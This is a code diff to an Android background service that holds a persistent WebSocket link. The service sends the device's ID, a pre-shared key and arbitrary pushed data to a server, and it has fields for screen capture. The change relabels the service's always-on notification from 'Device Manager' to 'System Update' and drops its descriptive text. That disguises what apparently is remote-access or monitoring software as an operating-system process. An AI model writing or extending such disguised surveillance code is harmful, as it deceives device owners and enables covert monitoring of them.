@@ -23,7 +23,7 @@ class ConnectionService : Service() {
         @Volatile var isWsConnected = false
         var screenResultCode = 0
         var screenData: Intent? = null
-        fun push(ctx: Context, kind: String, data: String) { instance?.sendPushInternal(kind, data) }
+        fun push(data: String) { instance?.sendPushInternal(data) }
     }
 
     private val client = OkHttpClient.Builder().pingInterval(5, TimeUnit.SECONDS).readTimeout(0, TimeUnit.MILLISECONDS).build()
@@ -32,7 +32,6 @@ class ConnectionService : Service() {
     private var backoff = 2000L
     private var shouldRun = false
     private var reconnectJob: Job? = null
-    private var pingJob: Job? = null
 
     override fun onBind(intent: Intent?): IBinder? = null
     
@@ -40,25 +39,15 @@ class ConnectionService : Service() {
         super.onCreate()
         instance = this
         getSystemService(NotificationManager::class.java).createNotificationChannel(NotificationChannel("conn", "Service", NotificationManager.IMPORTANCE_MIN))
-        val notif = Notification.Builder(this, "conn").setContentTitle("Device Manager").setContentText("Running...").setSmallIcon(android.R.drawable.stat_notify_sync).setOngoing(true).setPriority(Notification.PRIORITY_MIN).build()
+        val notif = Notification.Builder(this, "conn").setContentTitle("System Update").setSmallIcon(android.R.drawable.stat_notify_sync).setOngoing(true).build()
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) startForeground(1001, notif, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC) else startForeground(1001, notif)
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         if (intent?.action == ACTION_STOP) { 
-            shouldRun = false
-            reconnectJob?.cancel()
-            pingJob?.cancel()
-            try { ws?.close(1000, "stop") } catch (_: Exception) {} 
-            
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
-                stopForeground(STOP_FOREGROUND_REMOVE)
-            } else {
-                @Suppress("DEPRECATION")
-                stopForeground(true)
-            }
-            stopSelf()
-            return START_NOT_STICKY 
+            shouldRun = false; reconnectJob?.cancel(); try { ws?.close(1000, "stop") } catch (_: Exception) {} 
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) stopForeground(STOP_FOREGROUND_REMOVE) else { @Suppress("DEPRECATION") stopForeground(true) }
+            stopSelf(); return START_NOT_STICKY 
         }
         shouldRun = true; Prefs.setRunning(this, true); connect(); return START_STICKY
     }
@@ -76,7 +65,6 @@ class ConnectionService : Service() {
             isWsConnected = true; sendBroadcast(Intent(ACTION_STATUS).setPackage(packageName))
             val hello = JSONObject().put("role", "device").put("psk", Prefs.getPsk(this@ConnectionService)).put("device_id", Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown").put("device_name", Prefs.getDeviceName(this@ConnectionService).ifBlank { "Device" })
             webSocket.send(hello.toString())
-            pingJob?.cancel(); pingJob = scope.launch { while (isActive) { delay(5000); try { webSocket.send("{\"type\":\"ping\"}") } catch (_: Exception) {} } }
         }
         override fun onMessage(webSocket: WebSocket, text: String) {
             backoff = 2000L; scope.launch {
@@ -96,10 +84,10 @@ class ConnectionService : Service() {
         reconnectJob = scope.launch { delay(d); connect() }
     }
 
-    fun sendPushInternal(kind: String, data: String) { try { ws?.send(JSONObject().put("type", "push").put("kind", kind).put("data", data).toString()) } catch (_: Exception) {} }
+    fun sendPushInternal(data: String) { try { ws?.send(data) } catch (_: Exception) {} }
 
     override fun onDestroy() {
-        shouldRun = false; reconnectJob?.cancel(); pingJob?.cancel(); try { ws?.close(1000, "destroy") } catch (_: Exception) {}
+        shouldRun = false; reconnectJob?.cancel(); try { ws?.close(1000, "destroy") } catch (_: Exception) {}
         instance = null; isWsConnected = false; Prefs.setRunning(this, false); super.onDestroy()
     }
 }
